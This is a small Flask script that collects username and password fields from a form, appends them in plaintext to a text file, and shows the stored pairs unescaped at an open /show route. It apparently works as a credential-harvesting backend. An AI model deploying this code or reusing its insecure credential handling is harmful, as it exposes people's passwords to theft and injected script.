from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/')
def index():
    with open("index.html","r",encoding="utf-8") as f:
        return f.read()

@app.route("/process", methods=["POST"])
def process():
    form = request.form
    f = open("savedFoal.txt", "a")
    f.write(f"{form['username']}:  {form['password']}\n")
    f.close()
    return redirect("/")

@app.route("/show")
def show():
    contents=""
    f = open("savedFoal.txt", "r")
    for i in range(10):
        contents += f"<h2>{f.readline()}</h2>"
        contents += "\n"
    f.close()
    contents +="<a href='/'><button>Go back</button></a>"
    return contents


app.run(host='0.0.0.0', port=81)

